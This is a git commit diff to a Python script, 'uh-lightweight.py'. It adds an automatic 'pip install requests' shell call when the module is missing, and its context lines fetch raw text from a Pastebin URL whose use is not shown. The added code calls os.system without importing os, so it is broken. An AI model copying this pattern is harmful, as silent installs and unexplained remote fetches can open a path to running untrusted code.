14ea35d5aa64029742d90569b8b36226964e28e3
notuni <122754855+notuni@users.noreply.github.com>
2023-01-17 11:36:23 -0500

    Update uh-lightweight.py

--- uh-lightweight.py
+++ uh-lightweight.py
@@ -1,4 +1,7 @@
-import requests
+try:
+    import requests
+except ModuleNotFoundError: 
+    os.system('pip install requests')
 getlink = 'https://pastebin.com/raw/Yc1rB5a9'
 one = requests.get(getlink)
 test = str(one.text)
